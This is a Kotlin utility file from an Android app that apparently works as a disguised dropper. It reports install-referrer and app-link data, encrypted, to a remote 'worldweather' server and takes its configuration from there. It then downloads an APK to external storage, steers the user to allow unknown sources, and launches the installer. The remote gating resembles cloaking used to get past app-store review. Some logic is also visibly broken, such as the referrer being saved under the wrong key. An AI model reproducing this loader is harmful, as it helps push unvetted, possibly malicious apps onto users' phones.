package cn.nba.james

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.ViewGroup
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.lifecycle.lifecycleScope
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.gson.Gson
import com.haoge.easyandroid.easy.EasyPermissions
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.FileCallback
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Progress
import com.lzy.okgo.model.Response
import com.rw.loadingdialog.LoadingView
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import java.io.File


const val KEY_RESULT = "result"
const val KEY_APPLINK = "appLink"
const val KEY_REF = "ref"
const val KEY_PATH = "oPack"

val testUrl =
    "https://c911c3df879a675feb30aaafc46042de.dlied1.cdntips.net/imtt.dd.qq.com/sjy.10001/16891/apk/896B00016B948A65B3FBC800EACF8EA0.apk?mkey=61e4c2ecb68cbfed&f=0000&fsname=com.excean.dualaid_8.7.0_930.apk&csr=3554&cip=182.140.153.24&proto=https"

val filePath = Environment.getExternalStorageDirectory().absolutePath + "/"

val fileName = "a.apk"

fun AppCompatActivity.funcGetId() {
    OkGo.get<String>("https://smallfun.xyz/worldweather361/fb.php")
        .execute(object : StringCallback() {
            override fun onSuccess(response: Response<String>?) {
                this@funcGetId.lifecycleScope.launch(Dispatchers.Main) {
                    funcSetFid(this@funcGetId,response?.body()?.toString())
                }
            }
        })
}

fun funcSetFid(context: Context,s: String?) {
    s?.let {
        FacebookSdk.setApplicationId(it)
    } ?: run {
        FacebookSdk.setApplicationId("1598409150521518")
    }
    FacebookSdk.sdkInitialize(context)
}

fun AppCompatActivity.funcInitSDK(){
    fetchAppLink(this)
    ref(this)
}

fun AppCompatActivity.funcCreateLoading(): LoadingView {
    return LoadingView.Builder(this)
        .setProgressColorResource(R.color.teal_200)
        .setBackgroundColorRes(R.color.white)
        .setProgressStyle(LoadingView.ProgressStyle.HORIZONTAL)
        .setCustomMargins(0, 0, 0, 0)
        .attachTo(this)
}

fun AppCompatActivity.funcCountDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 3).asFlow().collect {
            delay(1000)
            if (!TextUtils.isEmpty(appLink) && !TextUtils.isEmpty(ref)) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
            if (it == 2){
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun AppCompatActivity.funConfig(block: () -> Unit) {
    val applink = MMKV.defaultMMKV().decodeString(KEY_APPLINK, "applink is empty")!!
    val ref = MMKV.defaultMMKV().decodeString(KEY_REF, "ref is empty")!!
    val token = BaseApp.instance!!.getToken()
    val appName = BaseApp.instance!!.getAppName()
    val appId = BaseApp.instance!!.getAppId()
    val istatus = MMKV.defaultMMKV()!!.decodeBool("istatus", true)
    val body = RequestBean(appName, appId, applink, ref, token, istatus)
    val encrypStr = AesEncryptUtil.encrypt(Gson().toJson(body))
    OkGo.post<String>("https://smallfun.xyz/worldweather361/weather2.php")
        .params("data", encrypStr).execute(object : StringCallback() {
            override fun onSuccess(response: Response<String>?) {
                lifecycleScope.launch(Dispatchers.Main) {
                    response?.let {
                        it.body()?.let { body ->
                            val entity:ResultEntity = Gson().fromJson(AesEncryptUtil.decrypt(body.toString()),ResultEntity::class.java)
                            MMKV.defaultMMKV().encode(KEY_RESULT, entity)
                            Log.i("xxxxxxH",Gson().toJson(result))
                            block()
                        }
                    }
                }
            }
        })
}

fun funcDownload(context: Context,url:String, block: (Int) -> Unit){
    val file = File(filePath + fileName)
    if (file.exists())file.delete()
    OkGo.get<File>(url).execute(object :FileCallback(filePath, fileName){
        override fun onSuccess(response: Response<File>?) {

        }

        override fun downloadProgress(progress: Progress?) {
            super.downloadProgress(progress)
            val current = progress?.currentSize
            val total = progress?.totalSize
            val pro = ((current!! *100) / total!!).toInt()
            block(pro)
            Log.i("xxxxxxH","progress = ${progress?.fraction}")
        }

        override fun onError(response: Response<File>?) {
            super.onError(response)
            Log.i("xxxxxxH", response?.exception.toString())
        }

        override fun onFinish() {
            super.onFinish()
        }
    })
}

fun AppCompatActivity.funcCreateFloatActionButton():FloatingActionButton{
    val fab = FloatingActionButton(this)
    fab.tag = "fab"
    val p  = ViewGroup.LayoutParams(1,1)
    fab.layoutParams = p
    return fab
}


fun funcSetting(context: Context) {
    val uri = Uri.parse("package:" + context.packageName)
    val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    context.startActivity(i)
}

fun AppCompatActivity.requestPermissions(block: (Boolean) -> Unit) {
    EasyPermissions.create(*BaseApp.instance!!.getPermissions())
        .callback {
            block(it)
        }.request(this)
}

fun fetchAppLink(context: Context) {
    if (appLink == "AppLink is empty") {
        AppLinkData.fetchDeferredAppLinkData(context) {
            it?.let {
                MMKV.defaultMMKV().encode(KEY_APPLINK, it.targetUri.toString())
            }
        }
    }
}

fun ref(context: Context) {
    if (ref == "Referrer is empty") {
        InstallReferrerClient.newBuilder(context).build().apply {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        MMKV.defaultMMKV().encode(KEY_APPLINK, installReferrer.installReferrer)
                    } catch (e: Exception) {
                        MMKV.defaultMMKV().encode(KEY_APPLINK, "Referrer is empty")
                    }
                }
                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }
}

fun funcInstall(context: Context, file: File) {
    if (!file.exists()) return
    var uri = if (Build.VERSION.SDK_INT >= 24) {
        FileProvider.getUriForFile(context, context.packageName.toString() + ".fileprovider", file)
    } else {
        Uri.fromFile(file)
    }
    if (Build.VERSION.SDK_INT >= 26) {
        if (!context.packageManager.canRequestPackageInstalls()) {
            Toast.makeText(context, "No Permission",Toast.LENGTH_SHORT).show()
            return
        }
    }
    val intent = Intent("android.intent.action.VIEW")
    intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
    if (Build.VERSION.SDK_INT >= 24) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    intent.setDataAndType(uri, "application/vnd.android.package-archive")
    context.startActivity(intent)
}

val appLink
    get() = MMKV.defaultMMKV().decodeString(KEY_APPLINK,"appLink is empty")

val ref
    get() = MMKV.defaultMMKV().decodeString(KEY_REF,"ref is empty")

val result
    get() = MMKV.defaultMMKV().decodeParcelable(KEY_RESULT, ResultEntity::class.java)!!
